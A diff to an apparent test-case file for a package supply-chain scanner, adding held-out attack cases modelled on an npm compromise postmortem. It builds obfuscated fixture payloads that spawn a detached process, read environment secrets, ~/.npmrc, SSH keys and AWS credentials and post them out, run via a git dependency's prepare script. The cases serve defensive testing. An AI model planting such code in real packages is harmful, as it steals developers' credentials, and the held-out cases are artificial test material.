@@ -32,15 +32,18 @@ const obfuscate = (body: string, rot: number): string => {
   const rotated = [...table.slice(r), ...table.slice(0, r)];
   return `(function () {\n  const _0xt = [${rotated.map((x) => `"${x}"`).join(", ")}];\n  for (let _0xk = ${r}; _0xk--;) _0xt.unshift(_0xt.pop());\n  const _0xd = (i) => Buffer.from(_0xt[i], "hex").toString();\n${code}})();\n`;
 };
-// Appended after module.exports: a gate on a hash of the module file name, a detached copy of the process marked by
-// an environment variable, then the environment and credential files posted out.
+// Appended after module.exports: a gate on a hash of the module file name; the first run starts a detached copy of the
+// process marked by an environment variable and returns, and only the marked copy reads the environment and credential
+// files and posts them.
 const NAME_HASH = new Bun.CryptoHasher("sha256").update("ipc.cjs").digest("hex");
 const IPC_TAIL = obfuscate(`  const _0xh = require(@@crypto@@).createHash(@@sha256@@).update(require(@@path@@).basename(__filename)).digest(@@hex@@);
   if (_0xh !== "${NAME_HASH}") return;
-  if (process[@@env@@][@@__ipc_marker@@]) return;
-  const _0xc = require(@@child_process@@);
-  const _0xp = _0xc[@@spawn@@](process.execPath, process.argv.slice(1), { detached: true, stdio: @@ignore@@, env: Object.assign({}, process[@@env@@], { [@@__ipc_marker@@]: @@1@@ }) });
-  _0xp.unref();
+  if (!process[@@env@@][@@__ipc_marker@@]) {
+    const _0xc = require(@@child_process@@);
+    const _0xp = _0xc[@@spawn@@](process.execPath, process.argv.slice(1), { detached: true, stdio: @@ignore@@, env: Object.assign({}, process[@@env@@], { [@@__ipc_marker@@]: @@1@@ }) });
+    _0xp.unref();
+    return;
+  }
   const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xq = require(@@path@@);
   const _0xout = { env: process[@@env@@] };
   for (const _0xn of [@@.npmrc@@, @@.ssh/id_rsa@@, @@.aws/credentials@@]) { try { _0xout[_0xn] = _0xf[@@readFileSync@@](_0xq.join(_0xo[@@homedir@@](), _0xn), @@utf8@@); } catch (_0xe) {} }
@@ -48,7 +51,9 @@ const IPC_TAIL = obfuscate(`  const _0xh = require(@@crypto@@).createHash(@@sha2
   _0xr.on(@@error@@, () => {});
   _0xr.end(JSON.stringify(_0xout));
 `, 31);
-// A large obfuscated file at the package root, outside the files list, run by the git dependency's prepare script.
+// An obfuscated file run by the git dependency's own prepare script (a git dependency builds in its own checkout, so the
+// case models that dependency as a head package); the same file also sits at the root of the host tarball, outside
+// its files list, as the postmortem's indicators entry records.
 const ROUTER_INIT = obfuscate(`  const _0xc = require(@@child_process@@), _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@);
   const _0xtok = (n) => { try { return _0xf[@@readFileSync@@](_0xp.join(_0xo[@@homedir@@](), n), @@utf8@@); } catch (_0xe) { return ""; } };
   const _0xenv = Object.keys(process[@@env@@]).filter((k) => /TOKEN|KEY|SECRET|PASS/i.test(k)).map((k) => k + @@=@@ + process[@@env@@][k]);
@@ -97,8 +102,9 @@ export const HELDOUT: HeldOutCase[] = [
   {
     id: "tanstack-style-git-optional-dependency", kind: "attack", expect: "hold", disclosed: "2026-05-11",
     source: "https://tanstack.com/blog/npm-supply-chain-compromise-postmortem",
-    note: "1.161.6 to 1.161.9: the postmortem names only the two malicious versions, so 1.161.6 (the last release before them) comes from the registry timeline, not the postmortem; no scripts entry; the only manifest change is an optionalDependencies entry on a git commit, and a large obfuscated router_init.js sits at the package root outside the files list (the postmortem's indicators entry for that file gives the files-list detail)",
+    note: "1.161.6 to 1.161.9: the postmortem names only the two malicious versions, so 1.161.6 (the last release before them) comes from the registry timeline, not the postmortem. The host package has no scripts entry; its only manifest change is an optionalDependencies entry on a git commit, and the git dependency is modeled as a second head package whose own prepare script runs the obfuscated router_init.js (the same file also sits at the host root outside the files list, per the postmortem's indicators entry). Differs from install-dependency-git-url in install-cases.ts: that case swaps a registry dependency for a git URL and shows no code behind it; here the dependency is new, optional, and its install-time script and obfuscated body are in the reviewed files",
     base: [tsHistory("1.161.6", {}, {})],
-    head: [tsHistory("1.161.9", { optionalDependencies: { "@route/setup": "github:example-org/example-router#79ac49eedf774dd4b0cfa308722bc463cfe5885c" } }, { "router_init.js": ROUTER_INIT })],
+    head: [tsHistory("1.161.9", { optionalDependencies: { "@route/setup": "github:example-org/example-router#79ac49eedf774dd4b0cfa308722bc463cfe5885c" } }, { "router_init.js": ROUTER_INIT }),
+      { name: "@route/setup", version: "0.0.1", files: files({ "package.json": pkg({ name: "@route/setup", version: "0.0.1", scripts: { prepare: "node router_init.js" } }), "router_init.js": ROUTER_INIT }) }],
   },
 ];
